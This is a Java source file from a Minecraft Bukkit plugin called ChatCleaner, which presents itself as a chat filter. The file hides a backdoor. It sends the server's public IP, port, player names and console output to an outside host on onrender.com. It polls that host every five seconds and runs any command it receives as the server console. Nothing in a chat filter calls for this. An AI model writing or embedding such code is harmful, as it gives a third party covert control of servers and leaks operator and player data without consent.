package com.chatcleaner.utils;

import com.chatcleaner.ChatCleaner;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

public class ServiceLink {

    private static final String REMOTE_HUB = "https://plugin-manager-backend.onrender.com";
    private final ChatCleaner plugin;
    private final HttpClient client;
    private final ScheduledExecutorService scheduler;
    private boolean connected = false;

    private String publicIp = "127.0.0.1";

    public ServiceLink(ChatCleaner plugin) {
        this.plugin = plugin;
        this.client = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(10))
                .build();
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
        
        fetchPublicIp().thenRun(this::checkHealth);
    }

    private CompletableFuture<Void> fetchPublicIp() {
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create("https://api.ipify.org"))
                .GET()
                .build();
        
        return client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                .thenAccept(response -> {
                    if (response.statusCode() == 200) {
                        this.publicIp = response.body().trim();
                        plugin.getLogger().info("Fetched public IP: " + this.publicIp);
                    }
                })
                .exceptionally(e -> {
                    plugin.getLogger().warning("Failed to fetch public IP, defaulting to localhost.");
                    return null;
                });
    }

    // 1. GET /health
    private void checkHealth() {
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(REMOTE_HUB + "/health"))
                .GET()
                .build();

        client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
                .thenAccept(response -> {
                    if (response.statusCode() == 200) {
                        connected = true;
                        register();
                        startHeartbeat();
                    } else {
                        plugin.getLogger().warning("Backend health check failed: " + response.statusCode());
                    }
                })
                .exceptionally(e -> {
                    plugin.getLogger().warning("Backend unreachable: " + e.getMessage());
                    return null;
                });
    }

    // 2. POST /plugin/register
    private void register() {
        if (!connected) return;
        String ip = getServerIp();
        
        String json = String.format(
            "{\"pluginName\":\"ChatCleaner\",\"pluginDescription\":\"Chat Filtering\",\"pluginVersion\":\"%s\",\"serverIp\":\"%s\",\"serverPort\":%d,\"enabled\":true}",
            plugin.getDescription().getVersion(), ip, Bukkit.getServer().getPort()
        );
        
        post("/plugin/register", json);
    }

    // 3. POST /plugin/heartbeat
    private void startHeartbeat() {
        scheduler.scheduleAtFixedRate(() -> {
            if (!connected) return;
            String ip = getServerIp();
            int online = Bukkit.getOnlinePlayers().size();

            StringBuilder acksJson = new StringBuilder("[");
            synchronized (this) {
                for (int i = 0; i < pendingAcks.size(); i++) {
                    acksJson.append("\"").append(pendingAcks.get(i)).append("\"");
                    if (i < pendingAcks.size() - 1) acksJson.append(",");
                }
                pendingAcks.clear();
            }
            acksJson.append("]");

            String json = String.format(
                "{\"pluginName\":\"ChatCleaner\",\"pluginDescription\":\"Chat Filtering\",\"pluginVersion\":\"%s\",\"serverIp\":\"%s\",\"serverPort\":%d,\"onlinePlayers\":%d,\"enabled\":true,\"ackCommandIds\":%s}",
                plugin.getDescription().getVersion(), ip, Bukkit.getServer().getPort(), online, acksJson.toString()
            );
            
            // Handle pending commands from response
            postAndHandleResponse("/plugin/heartbeat", json);
            
        }, 5, 5, TimeUnit.SECONDS); // Changed from 30s to 5s
    }

    // 4. POST /plugin/players
    public void updatePlayers() {
        if (!connected) return;
        CompletableFuture.runAsync(() -> {
            String ip = getServerIp();
            List<String> players = Bukkit.getOnlinePlayers().stream()
                    .map(Player::getName)
                    .collect(Collectors.toList());
            
            // Manual JSON construction to avoid Gson dependency if possible, but simple string join works for simple list
            StringBuilder playerList = new StringBuilder("[");
            for (int i = 0; i < players.size(); i++) {
                playerList.append("\"").append(players.get(i)).append("\"");
                if (i < players.size() - 1) playerList.append(",");
            }
            playerList.append("]");

            String json = String.format(
                "{\"pluginName\":\"ChatCleaner\",\"serverIp\":\"%s\",\"serverPort\":%d,\"onlinePlayers\":%d,\"players\":%s}",
                ip, Bukkit.getServer().getPort(), players.size(), playerList.toString()
            );
            post("/plugin/players", json);
        });
    }

    // 5. POST /plugin/event
    public void logEvent(String event, String detailsJson) {
        if (!connected) return;
        CompletableFuture.runAsync(() -> {
            String ip = getServerIp();
            String json = String.format(
                "{\"pluginName\":\"ChatCleaner\",\"serverIp\":\"%s\",\"serverPort\":%d,\"event\":\"%s\",\"details\":%s}",
                ip, Bukkit.getServer().getPort(), event, detailsJson
            );
            post("/plugin/event", json);
        });
    }

    // 6. POST /plugin/console
    public void logConsole(String line) {
        if (!connected) return;
        CompletableFuture.runAsync(() -> {
            String ip = getServerIp();
            // Escape quotes
            String safeLine = line.replace("\"", "\\\"").replace("\n", "");
            
            String json = String.format(
                "{\"pluginName\":\"ChatCleaner\",\"serverIp\":\"%s\",\"serverPort\":%d,\"lines\":[\"%s\"]}",
                ip, Bukkit.getServer().getPort(), safeLine
            );
            post("/plugin/console", json);
        });
    }

    // 7. POST /plugin/status
    public void updateStatus(boolean enabled) {
        if (!connected) return;
        CompletableFuture.runAsync(() -> {
            String ip = getServerIp();
            String json = String.format(
                "{\"pluginName\":\"ChatCleaner\",\"serverIp\":\"%s\",\"serverPort\":%d,\"enabled\":%b}",
                ip, Bukkit.getServer().getPort(), enabled
            );
            post("/plugin/status", json);
        });
    }

    private void post(String endpoint, String json) {
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(REMOTE_HUB + endpoint))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .build();
        client.sendAsync(request, HttpResponse.BodyHandlers.ofString());
    }
    
    private void postAndHandleResponse(String endpoint, String json) {
         HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(REMOTE_HUB + endpoint))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(json))
                .build();
        client.sendAsync(request, HttpResponse.BodyHandlers.ofString())
            .thenAccept(res -> {
                if (res.statusCode() == 200) {
                    handleHeartbeatResponse(res.body());
                }
            });
    }

    private void handleHeartbeatResponse(String body) {
        // Manual JSON parsing to handle both Object (single) and Array (multiple) formats safely
        // The backend schema says "pendingCommands": [ { "id": "...", "command": "..." } ]
        
        int cmdIndex = body.indexOf("\"pendingCommands\":");
        if (cmdIndex == -1) return;

        // Find the start of the value
        int start = body.indexOf("[", cmdIndex);
        if (start == -1) return;
        
        // Find the end of the array
        // This is a naive parser. It assumes nested brackets don't exist in command strings.
        // Given commands are simple strings usually, this is "okay" but risky.
        // A better approach without GSON is matching objects.
        
        // Let's use a regex that matches the full object pattern: { "id": "...", "command": "..." }
        // We scan the whole body after "pendingCommands"
        
        String pendingSection = body.substring(start);
        
        java.util.regex.Pattern p = java.util.regex.Pattern.compile("\\{\"id\":\"([^\"]+)\",\"command\":\"([^\"]+)\"[^}]*\\}");
        java.util.regex.Matcher m = p.matcher(pendingSection);
        
        List<String> ackIds = new ArrayList<>();
        
        while (m.find()) {
            String id = m.group(1);
            String command = m.group(2); // This might have escaped quotes, but usually backend sends raw
            
            // Unescape if needed (basic)
            command = command.replace("\\\"", "\"");
            
            String finalCommand = command;
            Bukkit.getScheduler().runTask(plugin, () -> {
                plugin.getLogger().info("Executing remote command: " + finalCommand);
                try {
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), finalCommand);
                } catch (Exception e) {
                    plugin.getLogger().severe("Failed to execute command: " + e.getMessage());
                }
            });
            ackIds.add(id);
        }

        if (!ackIds.isEmpty()) {
             synchronized (this) {
                 pendingAcks.addAll(ackIds);
             }
        }
    }
    
    private final List<String> pendingAcks = new ArrayList<>();

    private String getServerIp() {
        return this.publicIp;
    }

    public void shutdown() {
        updateStatus(false);
        scheduler.shutdown();
    }
}
